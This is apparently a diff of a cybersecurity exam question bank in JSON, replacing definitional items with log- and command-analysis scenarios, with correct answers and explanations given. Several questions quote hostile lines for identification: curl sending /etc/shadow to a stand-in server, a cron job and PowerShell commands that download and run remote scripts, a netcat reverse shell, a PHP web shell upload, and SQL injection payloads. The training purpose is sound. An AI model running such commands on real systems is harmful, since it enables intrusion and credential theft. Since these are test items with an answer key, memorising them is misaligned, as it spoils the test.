+      "correctAnswerIndex": 0,
+      "explanation": "DPI examines the content of network traffic, allowing detection and potential blocking of unusual HTTP methods like PUT used for data exfiltration.",
+      "examTip": "Deep packet inspection helps detect and block non-standard data transfers across network boundaries."
     },
     {
       "id": 26,
-      "question": "Which of the following is a key principle of the 'principle of least privilege'?",
+      "question": "Review the Python code snippet:\n\nimport pickle\nuser_data = pickle.loads(untrusted_input)\n\nWhich security issue could arise from this code if `untrusted_input` comes from an external source?",
       "options": [
-        "Users should be granted the maximum level of access to all systems. ",
-        "Users should be granted only the minimum necessary access rights to perform their job duties.",
-        "All users should have administrator privileges. ",
-        "Access controls are unnecessary if strong passwords are used. "
+        "Insecure deserialization",
+        "Buffer overflow",
+        "SQL injection",
+        "Cross-site scripting (XSS)"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "The principle of least privilege restricts access, not maximizes it. Administrator privileges for all is a major security risk. Strong passwords are important, but they don't replace access controls. The core idea is to grant users only the minimum necessary permissions to do their jobs, limiting the potential damage from compromised accounts or insider threats.",
-      "examTip": "Always apply the principle of least privilege to minimize the potential impact of security breaches."
+      "correctAnswerIndex": 0,
+      "explanation": "Python's `pickle.loads()` can execute arbitrary code during deserialization, making it vulnerable if untrusted input is provided.",
+      "examTip": "Never use `pickle.loads()` on untrusted data—use safer alternatives like `json.loads()` when possible."
     },
     {
       "id": 27,
-      "question": "Which of the following BEST describes the purpose of a vulnerability scan report?",
+      "question": "A newly discovered vulnerability in a popular content management system allows arbitrary file uploads without validation.\n\nWhich risk does this vulnerability primarily introduce?",
       "options": [
-        "To provide a detailed analysis of all network traffic. ",
-        "To list identified vulnerabilities, their severity, and potential remediation steps.",
-        "To automatically fix all identified vulnerabilities. ",
-        "To track the physical location of all network devices. "
+        "Remote code execution (RCE)",
+        "Privilege escalation",
+        "Cross-site scripting (XSS)",
+        "Session fixation"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Vulnerability scan reports don't analyze all traffic or track device locations.  They don't automatically fix vulnerabilities (that's remediation). The report summarizes discovered weaknesses, their risk level (using metrics like CVSS), and provides recommendations for fixing them. This helps prioritize remediation efforts.",
-      "examTip": "A vulnerability scan report is a critical document for understanding and addressing security weaknesses."
+      "correctAnswerIndex": 0,
+      "explanation": "Unrestricted file uploads can lead to remote code execution if attackers upload executable scripts that the server later runs.",
+      "examTip": "Always enforce file type and content validation for file uploads."
     },
     {
       "id": 28,
-      "question": "Which of the following network protocols is commonly used for secure remote access to a server's command-line interface?",
+      "question": "An attacker uses the following command:\n\ncurl -X POST -d @/etc/shadow http://malicious-server.com/upload\n\nWhich attack objective is the attacker trying to achieve?",
       "options": [
-        "FTP. ",
-        "Telnet. ",
-        "SSH",
-        "HTTP. "
+        "Data exfiltration of sensitive credential files",
+        "Establishing a reverse shell connection",
+        "Conducting a denial-of-service (DoS) attack",
+        "Injecting malicious code into the server"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "FTP and Telnet transmit data in plain text, making them insecure. HTTP is for web traffic, not command-line access. SSH (Secure Shell) provides encrypted communication, making it the standard protocol for secure remote command-line access.",
-      "examTip": "Always use SSH for secure remote access to servers, as it encrypts the communication channel."
+      "correctAnswerIndex": 0,
+      "explanation": "The `/etc/shadow` file contains password hashes. Posting it to an external server indicates an attempt to exfiltrate sensitive data.",
+      "examTip": "Monitor outbound HTTP POST requests for potential data exfiltration attempts."
     },
     {
       "id": 29,
-      "question": "What is 'threat modeling'?",
+      "question": "A suspicious file is analyzed in a sandbox. The file spawns multiple child processes, disables endpoint protection, and contacts external IPs over port 8080.\n\nWhat does this behavior suggest?",
       "options": [
-        "The practice of identifying, analyzing, and prioritizing potential threats to a system or application.",
-        "Building a physical model of a network to identify security weak points. ",
-        "Creating a detailed inventory of all hardware and software assets. ",
-        "Simulating real-world attacks to test security controls. "
+        "Ransomware activity attempting to disable defenses",
+        "Credential harvesting via malicious scripts",
+        "Legitimate update process with elevated permissions",
+        "Distributed denial-of-service (DDoS) botnet installation"
       ],
       "correctAnswerIndex": 0,
-      "explanation": "Threat modeling involves identifying, analyzing, and prioritizing risks. It's not a physical model, asset inventory, or penetration test, but rather a proactive approach to design more secure systems by understanding potential attack vectors and vulnerabilities.",
-      "examTip": "Threat modeling is a crucial part of secure system design and helps anticipate potential attacks."
+      "explanation": "Disabling endpoint protection and spawning child processes are common ransomware behaviors as part of system compromise and encryption routines.",
+      "examTip": "Malware that disables security tools and connects externally often indicates ransomware or trojan activity."
     },
     {
       "id": 30,
-      "question": "A user reports receiving an email that claims to be from their bank, asking them to click a link to update their account information. The link leads to a website that looks similar to the bank's website but has a slightly different URL. This is MOST likely an example of:",
+      "question": "During a web application penetration test, the tester discovers that session tokens are predictable and do not expire after logout.\n\nWhat is the primary risk associated with this finding?",
       "options": [
-        "A legitimate security notification from the bank. ",
-        "A phishing attack.",
-        "A denial-of-service (DoS) attack. ",
-        "A cross-site scripting (XSS) attack. "
+        "Session hijacking",
+        "Cross-site scripting (XSS)",
+        "SQL injection",
+        "Broken access control"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Legitimate notifications don't use suspicious URLs. DoS attacks target availability. XSS involves injecting malicious scripts. This scenario describes a phishing attack, where the attacker impersonates a trusted entity (the bank) to trick the user into revealing sensitive information (login credentials) by directing them to a fake website.",
-      "examTip": "Be wary of emails with suspicious links or requests for personal information, especially if they have slightly altered URLs."
+      "correctAnswerIndex": 0,
+      "explanation": "Predictable session tokens combined with lack of expiration increase the risk of session hijacking, where attackers can impersonate legitimate users.",
+      "examTip": "Always ensure session tokens are random, securely generated, and expire after logout."
     },
     {
       "id": 31,
-      "question": "Which type of malware replicates itself and spreads to other computers without requiring user interaction?",
+      "question": "You review the following log entries from a web server:\n\n192.168.10.10 - - [23/Feb/2025:10:45:11 +0000] \"GET /index.php?id=1 UNION SELECT username, password FROM users-- HTTP/1.1\" 200 532\n\nWhat type of attack is being attempted?",
       "options": [
-        "Virus. ",
-        "Worm",
-        "Trojan Horse. ",
-        "Spyware. "
+        "SQL Injection",
+        "Cross-site scripting (XSS)",
+        "Server-side request forgery (SSRF)",
+        "Remote file inclusion (RFI)"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Viruses require a host file and user action to spread. Trojan Horses disguise themselves as legitimate software. Spyware collects information without the user's knowledge. Worms are self-replicating malware that can spread across networks without any user intervention, making them particularly dangerous.",
-      "examTip": "Worms are a significant threat because of their ability to spread rapidly and autonomously."
+      "correctAnswerIndex": 0,
+      "explanation": "The use of `UNION SELECT` in the URL suggests an attempt at SQL injection to retrieve data from the `users` table.",
+      "examTip": "Look for SQL keywords like UNION, SELECT, and WHERE in URLs when detecting SQL injection attempts."
     },
     {
       "id": 32,
-      "question": "What is the FIRST step in the incident response process?",
+      "question": "A network traffic analysis shows continuous small-sized DNS queries to multiple non-existent subdomains of a suspicious domain.\n\nWhich threat technique is most likely represented?",
       "options": [
-        "Containment. ",
-        "Eradication. ",
-        "Preparation",
-        "Detection and Analysis. "
+        "Domain generation algorithm (DGA)",
+        "DNS poisoning",
+        "DNS amplification attack",
+        "Man-in-the-middle (MITM) attack"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "Containment, eradication, and detection/analysis are all later stages. The first step is Preparation, which involves establishing policies, procedures, tools, and training to be ready to handle incidents effectively before they occur.",
-      "examTip": "Proper preparation is crucial for a successful incident response.  You can't respond effectively if you're not prepared."
+      "correctAnswerIndex": 0,
+      "explanation": "Frequent queries to random subdomains typically indicate DGA usage, allowing malware to find active command-and-control servers.",
+      "examTip": "Identify DGA activity by detecting high-volume DNS requests for non-existent domains."
     },
     {
       "id": 33,
-      "question": "What is the purpose of a 'file integrity monitoring' (FIM) tool?",
+      "question": "You discover the following cron job on a Linux server:\n\n* * * * * root curl -fsSL http://malicious-ip.com/payload.sh | sh\n\nWhat is the security concern associated with this cron job?",
       "options": [
-        "To encrypt files on a system. ",
-        "To monitor changes to critical system files and detect unauthorized modifications.",
-        "To back up files to a remote server. ",
-        "To scan files for viruses. "
+        "Persistence mechanism for malicious code execution",
+        "Privilege escalation via kernel module exploitation",
+        "Credential harvesting using man-in-the-middle attacks",
+        "Local file inclusion vulnerability in web applications"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "FIM tools don't encrypt, back up, or scan for viruses (though they might integrate with such tools). FIM tools track changes to important files (system files, configuration files, etc.).  Unexpected changes can indicate a compromise, such as malware modifying system files.",
-      "examTip": "FIM is an important tool for detecting unauthorized changes to critical files, which can be an indicator of compromise."
+      "correctAnswerIndex": 0,
+      "explanation": "The cron job downloads and executes a script every minute, serving as a persistence mechanism for ongoing malicious code execution.",
+      "examTip": "Review cron jobs for unauthorized scheduled tasks that download and execute remote code."
     },
     {
       "id": 34,
-      "question": "Which type of attack exploits a vulnerability in a web application by injecting malicious SQL code?",
+      "question": "You are reviewing SIEM alerts and notice an internal endpoint making repeated outbound connections to port 6667 on multiple external IP addresses.\n\nWhich type of threat does this activity most likely indicate?",
       "options": [
-        "Cross-site Scripting. ",
-        "SQL Injection",
-        "Brute Force. ",
-        "Phishing. "
+        "Botnet command-and-control (C2) communication",
+        "SQL injection attempts on external servers",
+        "Credential stuffing attacks targeting external services",
+        "Lateral movement within the internal network"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Cross-site scripting injects client-side scripts. Brute force involves trying many passwords.  Phishing uses social engineering. SQL Injection specifically targets databases by injecting malicious SQL commands into input fields, allowing attackers to potentially read, modify, or delete data.",
-      "examTip": "SQL Injection is a serious threat to web applications that interact with databases."
+      "correctAnswerIndex": 0,
+      "explanation": "Port 6667 is commonly associated with IRC-based botnet C2 communication, which suggests that the endpoint may be part of a botnet.",
+      "examTip": "Unusual outbound traffic on known C2 ports (e.g., 6667 for IRC) may indicate botnet activity."
     },
     {
       "id": 35,
-      "question": "Which of the following is a common technique used to obfuscate malicious code?",
+      "question": "A vulnerability scanner reports a critical vulnerability allowing arbitrary code execution via deserialization of untrusted data in a web application.\n\nWhich control would MOST effectively mitigate this risk?",
       "options": [
-        "Using clear and descriptive variable names. ",
-        "Adding comments to explain the code's functionality. ",
-        "Using encryption, encoding, or packing to make the code difficult to understand.",
-        "Writing the code in a high-level programming language. "
+        "Input validation and use of secure serialization methods",
+        "Implementing strict Content Security Policy (CSP)",
+        "Enabling multi-factor authentication (MFA) for all users",
+        "Disabling directory listing on the web server"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "Clear variable names, comments, and high-level languages aid understanding, not obfuscation. Obfuscation aims to make code harder to analyze. Techniques include encryption (hiding the code entirely), encoding (transforming the code), and packing (compressing and often encrypting the code).",
-      "examTip": "Obfuscation is used to make malware analysis more difficult."
+      "correctAnswerIndex": 0,
+      "explanation": "The most effective mitigation is to validate input and use secure serialization methods that do not allow code execution during deserialization.",
+      "examTip": "Avoid insecure deserialization by using safe formats like JSON and proper input validation."
     },
     {
       "id": 36,
-      "question": "What is the role of a 'Security Operations Center (SOC)'?",
+      "question": "Review the following SIEM rule:\n\nIF (process_name = \"powershell.exe\") AND (command_line CONTAINS \"-enc\" OR \"-encodedcommand\") THEN ALERT\n\nWhat threat does this rule aim to detect?",
       "options": [
-        "To develop new security software. ",
-        "To monitor, detect, analyze, and respond to security incidents.",
-        "To conduct penetration testing. ",
-        "To manage physical security of a building. "
+        "Obfuscated PowerShell command execution",
+        "Privilege escalation using PowerShell",
+        "Malicious DLL injection via PowerShell",
+        "Credential harvesting with Mimikatz"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "SOC's don't just develop software, conduct penetration testing, or physically secure the building, though they may use penetration test data. The SOC is the team responsible for the ongoing monitoring and defense of an organization's security posture.  They use various tools (SIEM, EDR, etc.) to detect and respond to threats.",
-      "examTip": "The SOC is the central hub for an organization's security monitoring and incident response activities."
+      "correctAnswerIndex": 0,
+      "explanation": "The `-enc` or `-encodedcommand` flags are used to obfuscate PowerShell commands, commonly seen in malicious activities to evade detection.",
+      "examTip": "Obfuscated PowerShell commands are often used by attackers to bypass security controls—monitor them closely."
     },
     {
       "id": 37,
-      "question": "Which of the following is a benefit of using a cloud access security broker (CASB)?",
+      "question": "The following API request was captured:\n\nPOST /api/user/create HTTP/1.1\nHost: api.example.com\nContent-Type: application/json\n\n{\n   \"username\": \"attacker\",\n   \"role\": \"admin\"\n}\n\nWhat type of vulnerability does this demonstrate?",
       "options": [
-        "CASBs eliminate the need for firewalls. ",
-        "CASBs provide visibility and control over cloud application usage.",
-        "CASBs encrypt all network traffic. ",
-        "CASBs prevent all malware infections. "
+        "Insecure Direct Object Reference (IDOR)",
+        "Broken access control",
+        "Cross-site request forgery (CSRF)",
+        "Command injection"
       ],
       "correctAnswerIndex": 1,
-      "explanation": "CASBs don't replace firewalls or guarantee malware prevention. They aren't solely for network traffic encryption. CASBs sit between cloud users and cloud providers, enforcing security policies and providing visibility into how cloud applications are being used. This helps organizations manage shadow IT, enforce data security, and ensure compliance.",
-      "examTip": "CASBs are essential for securing cloud applications and data."
+      "explanation": "Allowing role changes in user creation requests without proper authorization checks indicates broken access control.",
+      "examTip": "APIs should enforce strict access controls, especially when handling privilege-related operations."
     },
     {
       "id": 38,
-      "question": "Which of the following is MOST representative of a zero-trust security model?",
+      "question": "During incident response, the following PowerShell command is identified:\n\nInvoke-WebRequest -Uri http://malicious-site.com/malware.ps1 -OutFile malware.ps1; powershell.exe -ExecutionPolicy Bypass -File malware.ps1\n\nWhat is the attacker's objective in using this command?",
       "options": [
-        "Trusting all users and devices within the corporate network. ",
-        "Verifying the identity and security posture of every user and device, regardless of location, before granting access to resources.",
-        "Relying solely on perimeter security controls, such as firewalls. ",
-        "Using strong passwords as the primary security measure. "
+        "Download and execute a malicious script while bypassing execution policies",
+        "Establish a persistent backdoor using encoded PowerShell commands",
+        "Extract sensitive data from the local file system",
+        "Disable security defenses through privilege escalation"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Zero trust doesn't trust anything by default, inside or outside the network. It goes beyond perimeter security and passwords. Zero trust assumes no implicit trust and requires continuous verification of identity and device security posture before granting access to any resource, regardless of whether the user or device is inside or outside the traditional network perimeter.",
-      "examTip": "Zero trust operates on the principle of 'never trust, always verify.'"
+      "correctAnswerIndex": 0,
+      "explanation": "The command downloads a PowerShell script and executes it while bypassing execution restrictions, commonly used for initial payload delivery.",
+      "examTip": "Watch for `Invoke-WebRequest` combined with `-ExecutionPolicy Bypass` as signs of initial compromise."
     },
     {
       "id": 39,
-      "question": "What is 'beaconing' in the context of network security?",
+      "question": "A file analyzed in a sandbox environment shows the following behavior:\n- Connects to an external IP over port 4444\n- Attempts to modify Windows registry keys related to startup programs\n- Drops a new executable in the Windows Startup folder\n\nWhat does this behavior most likely indicate?",
       "options": [
-        "The process of encrypting network traffic. ",
-        "Regular, outbound communication from a compromised system to a command-and-control server.",
-        "Scanning a network for open ports. ",
-        "The process of authenticating users to a network. "
+        "Establishing persistence on the infected host",
+        "Privilege escalation via registry manipulation",
+        "Ransomware execution targeting user directories",
+        "Command-and-control communication for remote access"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Beaconing is not about encryption, port scanning or user authentication. Beaconing is a telltale sign of malware. Infected systems often \"beacon\" out to a C2 server at regular intervals, awaiting instructions or sending data. This regular communication pattern is a key indicator of compromise.",
-      "examTip": "Detecting beaconing activity is crucial for identifying compromised systems."
+      "correctAnswerIndex": 0,
+      "explanation": "Modifying startup registry keys and placing executables in the Startup folder are classic methods of achieving persistence.",
+      "examTip": "Persistence mechanisms often involve autorun configurations—monitor registry and startup folders closely."
     },
     {
       "id": 40,
-      "question": "What is the purpose of the MITRE ATT&CK framework?",
+      "question": "A security analyst observes this log entry:\n\nFeb 23 15:45:21 webserver sshd[2024]: Accepted password for user from 203.0.113.10 port 50542 ssh2\nFeb 23 15:45:24 webserver kernel: Outbound connection established to 198.51.100.25:12345\n\nWhat should the analyst investigate first?",
       "options": [
-        "To provide a list of all known software vulnerabilities. ",
-        "To offer a structured knowledge base of adversary tactics, techniques, and procedures (TTPs).",
-        "To automatically patch security vulnerabilities. ",
-        "To encrypt data at rest and in transit. "
+        "The nature of the outbound connection to port 12345",
+        "Authentication logs for brute force attempts",
+        "SSH key configurations for the user account",
+        "Firewall rules allowing port 50542 traffic"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "MITRE ATT&CK is not a vulnerability list, patch management tool, nor encryption system. It is a framework used to identify the behaviors of the attackers. It's a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations.  It helps organizations understand how attackers operate and improve their defenses.",
-      "examTip": "The MITRE ATT&CK framework is a valuable resource for understanding adversary behavior and improving threat detection."
+      "correctAnswerIndex": 0,
+      "explanation": "Outbound connections to high-numbered ports (e.g., 12345) immediately after authentication could indicate C2 activity; this should be prioritized.",
+      "examTip": "Prioritize investigating unusual outbound connections following authentication events—potential indicators of compromise."
     },
     {
       "id": 41,
-      "question": "A security analyst notices a large number of failed login attempts on a server from a single IP address within a short period. This is MOST likely an example of:",
+      "question": "During a forensic investigation, you find the following command in bash history:\n\nnc -e /bin/bash 203.0.113.45 4444\n\nWhat is the attacker attempting to achieve with this command?",
       "options": [
-        "A user forgetting their password. ",
-        "A brute-force attack.",
-        "A denial-of-service (DoS) attack. ",
-        "A misconfigured server. "
+        "Establish a reverse shell connection",
+        "Perform port scanning on the network",
+        "Create a persistent listener on port 4444",
+        "Download a malicious payload from a remote server"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "While a user might forget their password, many attempts from one IP quickly suggests an automated attack.  DoS aims to disrupt service, not crack passwords. Server misconfiguration is unlikely to cause this. A brute-force attack involves systematically trying many passwords (or usernames and passwords) in an attempt to gain unauthorized access.",
-      "examTip": "A high number of failed login attempts from a single source is a strong indicator of a brute-force attack."
+      "correctAnswerIndex": 0,
+      "explanation": "The `nc -e /bin/bash` command uses Netcat to create a reverse shell, giving the attacker remote control over the system.",
+      "examTip": "Look for Netcat (`nc`) commands with `-e` flags—common indicators of reverse shells."
     },
     {
       "id": 42,
-      "question": "What is the primary purpose of a 'DMZ' in a network architecture?",
+      "question": "A SIEM alert shows repeated failed login attempts followed by a successful login for the same user account within a short time frame. The successful login occurred from a foreign IP address not previously associated with the user.\n\nWhat should be the FIRST action?",
       "options": [
-        "To provide a secure zone for internal servers. ",
-        "To host publicly accessible servers, such as web servers, while isolating them from the internal network.",
-        "To store sensitive data. ",
-        "To create a virtual private network (VPN). "
+        "Disable the user account and initiate an investigation",
+        "Notify the user to confirm the legitimacy of the login",
+        "Check for lateral movement attempts from the compromised account",
+        "Perform a password reset for the user account"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "A DMZ is not for internal servers or VPN creation and is too risky of a location for sensitive data storage. A DMZ (demilitarized zone) is a network segment that sits between the internal network and the internet. It hosts services that need to be accessible from the outside (like web servers or email servers) but provides a buffer zone to protect the internal network if those external-facing servers are compromised.",
-      "examTip": "Think of a DMZ as a buffer zone between your internal network and the public internet."
+      "correctAnswerIndex": 0,
+      "explanation": "Disabling the account immediately prevents further potential malicious activity while an investigation is conducted.",
+      "examTip": "Account disablement is a critical containment step after suspected credential compromise."
     },
     {
       "id": 43,
-      "question": "Which of the following is a characteristic of a 'true positive' in the context of security alerts?",
+      "question": "You observe the following HTTP request during web application testing:\n\nPOST /api/upload HTTP/1.1\nHost: app.example.com\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n------WebKitFormBoundary\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\nContent-Type: application/x-php\n\n<?php system($_GET['cmd']); ?>\n------WebKitFormBoundary--\n\nWhich vulnerability is being exploited?",
       "options": [
-        "An alert that correctly identifies a malicious activity.",
-        "An alert that incorrectly identifies a benign activity as malicious. ",
-        "An alert that fails to identify a malicious activity. ",
-        "An alert that is generated for a non-existent event. "
+        "Unrestricted file upload leading to remote code execution",
+        "Cross-site scripting (XSS) through file injection",
+        "Insecure deserialization via file upload",
+        "Server-side request forgery (SSRF)"
       ],
       "correctAnswerIndex": 0,
-      "explanation": "A true positive is correct detection. A benign activity flagged as malicious is a false positive.  Failing to identify malicious activity is a false negative. A non-existent event wouldn't generate an alert. A true positive means the security system correctly identified an actual threat or malicious activity.",
-      "examTip": "A true positive means the alert was accurate and identified a real security issue."
+      "explanation": "Uploading a PHP shell script allows attackers to execute commands remotely, resulting in remote code execution.",
+      "examTip": "Ensure strict file validation and disable execution of uploaded files on web servers."
     },
     {
       "id": 44,
-      "question": "What does 'lateral movement' refer to in the context of a cyberattack?",
+      "question": "A suspicious process is identified on a workstation:\n\npowershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious-server.com/ps.ps1')\"\n\nWhat is the MOST LIKELY goal of this command?",
       "options": [
-        "An attacker gaining initial access to a network. ",
-        "An attacker moving from one compromised system to another within the same network.",
-        "An attacker exfiltrating data from a compromised system. ",
-        "An attacker encrypting data on a compromised system. "
+        "Download and execute a PowerShell script in memory",
+        "Obtain elevated privileges through a Windows exploit",
+        "Modify Group Policy settings for persistence",
+        "Extract credentials from the local SAM database"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Initial access is not lateral movement. Exfiltration is data theft. Encryption is often part of ransomware. Lateral movement is the process of an attacker moving within a network after gaining initial access. They might compromise one system, then use that access to pivot to other, more valuable systems.",
-      "examTip": "Lateral movement is a key tactic used by attackers to expand their control within a compromised network."
+      "correctAnswerIndex": 0,
+      "explanation": "The command downloads and executes a PowerShell script directly in memory (`IEX`), avoiding detection by traditional file-based scanners.",
+      "examTip": "Commands using `IEX` and `DownloadString` indicate fileless malware techniques."
     },
     {
       "id": 45,
-      "question": "Which type of attack involves sending specially crafted packets to a target system to exploit a vulnerability and potentially cause it to crash or become unresponsive?",
+      "question": "A user reports that their browser redirected them to an unknown site after clicking a legitimate link. Review the URL:\n\nhttps://example.com/redirect?url=http://malicious-site.com\n\nWhich vulnerability is most likely present?",
       "options": [
-        "Phishing. ",
-        "Denial of Service (DoS)",
-        "Man-in-the-Middle (MitM). ",
-        "Cross-Site Request Forgery (CSRF). "
+        "Open redirect vulnerability",
+        "Cross-site scripting (XSS)",
+        "Cross-site request forgery (CSRF)",
+        "SQL injection"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Phishing is social engineering. MitM intercepts communication. CSRF forces actions on a user's behalf. DoS attacks aim to disrupt services. This can involve flooding with traffic, but it can also involve sending malformed packets that exploit vulnerabilities to crash a system or service.",
-      "examTip": "DoS attacks can use various methods, including exploiting vulnerabilities, to disrupt service availability."
+      "correctAnswerIndex": 0,
+      "explanation": "Open redirect vulnerabilities occur when user-controlled input determines the redirection destination without validation.",
+      "examTip": "Always validate and sanitize URL parameters used in redirects."
     },
     {
       "id": 46,
-      "question": "What is the purpose of 'red teaming' in cybersecurity?",
+      "question": "During a security assessment, you find that an application stores passwords in plaintext in a database.\n\nWhat is the MOST critical risk associated with this practice?",
       "options": [
-        "To defend a network against simulated attacks. ",
-        "To simulate realistic attacks on an organization's systems and defenses to identify vulnerabilities and improve security posture.",
-        "To manage security vulnerabilities and prioritize remediation efforts. ",
-        "To develop security policies and procedures. "
+        "Immediate exposure of credentials if the database is compromised",
+        "Increased risk of SQL injection attacks",
+        "Exposure to session hijacking threats",
+        "Potential for privilege escalation within the application"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Defending against attacks is the blue team's role. Vulnerability management is a separate process. Policy development is a governance function. Red teaming involves ethical hacking.  A red team simulates attacks, acting like real-world adversaries, to test an organization's defenses and find weaknesses before malicious actors do.",
-      "examTip": "Red teaming is a proactive security exercise that simulates real-world attacks."
+      "correctAnswerIndex": 0,
+      "explanation": "Storing passwords in plaintext allows attackers to immediately gain user access upon database compromise, leading to further exploitation.",
+      "examTip": "Always store passwords using strong hashing algorithms like bcrypt or Argon2."
     },
     {
       "id": 47,
-      "question": "What is the purpose of using regular expressions (regex) in security analysis?",
+      "question": "A cloud infrastructure assessment reveals that sensitive data buckets in AWS S3 are publicly accessible.\n\nWhich control would most effectively mitigate this issue?",
       "options": [
-        "To encrypt data. ",
-        "To define patterns for searching and matching text within logs or other data.",
-        "To create secure passwords. ",
-        "To establish secure connections. "
+        "Implement strict bucket policies and ACL configurations",
+        "Enable encryption at rest using KMS-managed keys",
+        "Deploy CloudFront distributions with signed URLs",
+        "Set up CloudTrail logging for all S3 access events"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Regex is not for encryption, creating passwords, or establishing secure connections. Regular expressions are powerful tools for pattern matching. They allow analysts to define specific patterns to search for within large datasets like logs, identifying specific events, IP addresses, error messages, or other indicators of interest.",
-      "examTip": "Regex is a valuable skill for security analysts, enabling efficient searching and filtering of large datasets."
+      "correctAnswerIndex": 0,
+      "explanation": "Restricting public access by configuring proper bucket policies and ACLs ensures only authorized entities can access sensitive data.",
+      "examTip": "S3 buckets should have default deny-all policies unless explicitly required otherwise."
     },
     {
       "id": 48,
-      "question": "Which of the following is a common technique used in social engineering attacks?",
+      "question": "Your organization experiences a sudden spike in outbound traffic to multiple random IP addresses from several internal hosts. The traffic consists mainly of UDP packets.\n\nWhat type of attack does this MOST LIKELY indicate?",
       "options": [
-        "Exploiting software vulnerabilities. ",
-        "Impersonating a trusted individual or organization to manipulate victims into revealing sensitive information or taking actions.",
-        "Flooding a network with traffic. ",
-        "Injecting malicious code into a website. "
+        "DDoS participation as part of a botnet",
+        "Data exfiltration via covert channels",
+        "Man-in-the-middle (MITM) attack preparation",
+        "DNS amplification attack targeting external services"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Exploiting vulnerabilities is a technical attack. Flooding is DoS. Injecting code is XSS. Social engineering relies on psychological manipulation, not technical exploits. Attackers might pretend to be IT support, a colleague, or a trusted authority to trick victims.",
-      "examTip": "Social engineering attacks exploit human trust and psychology rather than technical vulnerabilities."
+      "correctAnswerIndex": 0,
+      "explanation": "The pattern suggests compromised hosts are participating in a DDoS attack, commonly using UDP traffic for amplification attacks.",
+      "examTip": "Monitor for unusual outbound UDP traffic patterns—common in botnet-based DDoS attacks."
     },
     {
       "id": 49,
-      "question": "What does 'mean time to detect (MTTD)' measure?",
+      "question": "An attacker uses the following request:\n\nGET /product?id=1; EXEC xp_cmdshell 'whoami';-- HTTP/1.1\nHost: vulnerableapp.com\n\nWhat is the attacker attempting to achieve?",
       "options": [
-        "The average time it takes to fix a security vulnerability. ",
-        "The average time it takes to identify a security incident or breach.",
-        "The average time it takes to recover from a security incident. ",
-        "The average time it takes to respond to a security alert. "
+        "Command injection via SQL Server stored procedures",
+        "Privilege escalation through local exploits",
+        "Exploitation of insecure deserialization processes",
+        "Session fixation through predictable session IDs"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "MTTD isn't about fixing, recovering, or responding. MTTD is a key metric that measures the detection speed. It's the average time between when a security incident occurs and when it's detected by the security team.  A lower MTTD is desirable.",
-      "examTip": "A lower MTTD indicates a more effective and responsive security posture."
+      "correctAnswerIndex": 0,
+      "explanation": "The `xp_cmdshell` procedure allows execution of OS commands from SQL Server; this is a command injection attempt.",
+      "examTip": "Disable dangerous stored procedures like `xp_cmdshell` unless absolutely necessary."
     },
     {
       "id": 50,
-      "question": "Which of the following is a benefit of using a centralized logging system?",
+      "question": "A suspicious binary is detected on an endpoint. Analysis reveals it:\n- Creates a new user with administrator privileges\n- Disables endpoint protection services\n- Contacts external IPs over non-standard ports\n\nWhich type of malware is most likely responsible for this behavior?",
       "options": [
-        "Centralized logging eliminates the need for endpoint security. ",
-        "Centralized logging makes it more difficult to correlate events across multiple systems. ",
-        "Centralized logging provides a single point for collecting and analyzing logs from various sources, improving visibility and incident response.",
-        "Centralized logging increases the risk of data breaches. "
+        "Rootkit",
+        "Trojan",
+        "Worm",
+        "Ransomware"
       ],
-      "correctAnswerIndex": 2,
-      "explanation": "Centralized logging doesn't eliminate endpoint security needs and it shouldn't increase data breach risks with proper security. Centralized logging is the opposite; it aggregates log data and greatly improves event correlation and incident response. Having all logs in one place makes it easier to see patterns, identify anomalies, and reconstruct events during investigations.",
-      "examTip": "Centralized logging is crucial for effective security monitoring and incident response."
+      "correctAnswerIndex": 1,
+      "explanation": "The behavior of creating admin users, disabling security tools, and establishing external connections is typical of trojans designed for long-term access.",
+      "examTip": "Trojans often mimic legitimate processes while establishing persistent backdoors for attackers."
     },
     {
       "id": 51,
-      "question": "Which type of attack involves an attacker intercepting communication between two parties without their knowledge?",
+      "question": "You review the following log from a web application firewall (WAF):\n\n[INFO] POST /login HTTP/1.1 200 OK\nPayload: username=admin' OR '1'='1&password=pass123\n\nWhich attack is being attempted?",
       "options": [
-        "Phishing. ",
-        "Man-in-the-middle (MitM)",
-        "Denial-of-Service (DoS). ",
-        "SQL Injection. "
+        "SQL Injection",
+        "Cross-site scripting (XSS)",
+        "Command injection",
+        "XML External Entity (XXE) attack"
       ],
-      "correctAnswerIndex": 1,
-      "explanation": "Phishing relies on social engineering. DoS disrupts services. SQL Injection targets databases. MitM attacks involve an attacker secretly placing themselves between two communicating parties, allowing them to eavesdrop on, or even modify, the communication.",
-      "examTip": "MitM attacks can compromise the confidentiality and integrity of communication."
+      "correctAnswerIndex": 0,
+      "explanation": "The payload includes `' OR '1'='1`, a typical SQL injection technique to bypass authentication.",
+      "examTip": "Watch for SQL logic manipulation in login forms to detect injection attempts."
     },
     {
       "id": 52,
-      "question": "Which of the following BEST describes the concept of 'risk acceptance'?",
+      "question": "A malware sample is analyzed and found to:\n- Use DNS queries to exfiltrate data\n- Communicate with an attacker-controlled domain\n- Utilize encoded data in DNS TXT records\n\nWhich technique does this malware use?",
       "options": [
-        "Ignoring all identified risks. ",
-        "Acknowledging the existence of a risk and choosing to take no action to mitigate it.",
